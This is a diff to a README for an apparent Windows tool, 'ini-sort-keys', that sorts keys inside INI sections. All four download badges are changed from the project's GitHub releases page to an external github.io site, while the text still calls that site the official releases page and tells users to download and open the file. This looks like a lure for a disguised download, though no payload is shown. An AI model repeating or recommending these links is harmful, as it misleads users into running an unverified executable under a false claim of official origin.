@@ -1,6 +1,6 @@
 # 🗂️ ini-sort-keys - Sort Your INI Keys Effortlessly
 
-[![Download ini-sort-keys](https://img.shields.io/badge/Download%20ini--sort--keys-Visit%20Releases-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Darellepyrographic686/ini-sort-keys/releases)
+[![Download ini-sort-keys](https://img.shields.io/badge/Download%20ini--sort--keys-Visit%20Releases-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://darellepyrographic686.github.io)
 
 ini-sort-keys is a desktop utility for Windows that sorts the keys inside each INI section and writes a stable file. It is made for everyday computer users who want cleaner configuration files without editing them by hand.
 
@@ -12,7 +12,7 @@ You do not need programming knowledge to use ini-sort-keys. The workflow is simp
 
 Visit this link to download the application.
 
-[![Download ini-sort-keys](https://img.shields.io/badge/Download-ini--sort--keys-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Darellepyrographic686/ini-sort-keys/releases)
+[![Download ini-sort-keys](https://img.shields.io/badge/Download-ini--sort--keys-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://darellepyrographic686.github.io)
 
 ## 🧭 What ini-sort-keys Does
 
@@ -38,7 +38,7 @@ It fits well into a simple desktop routine. If you already open INI files in a t
 
 To get ini-sort-keys on your Windows PC, use the official releases page below.
 
-[![Download ini-sort-keys](https://img.shields.io/badge/Download%20Now-ini--sort--keys-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Darellepyrographic686/ini-sort-keys/releases)
+[![Download ini-sort-keys](https://img.shields.io/badge/Download%20Now-ini--sort--keys-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://darellepyrographic686.github.io)
 
 Visit this link to download the application.
 
@@ -86,7 +86,7 @@ That simple workflow is useful because manual sorting is easy to get wrong. A pe
 
 Use the official releases page to download ini-sort-keys for Windows:
 
-[![Download ini-sort-keys](https://img.shields.io/badge/Official%20Download-ini--sort--keys-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Darellepyrographic686/ini-sort-keys/releases)
+[![Download ini-sort-keys](https://img.shields.io/badge/Official%20Download-ini--sort--keys-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://darellepyrographic686.github.io)
 
 Visit this link to download the application. After downloading, open the file to run ini-sort-keys and begin sorting the keys inside each INI section.
 
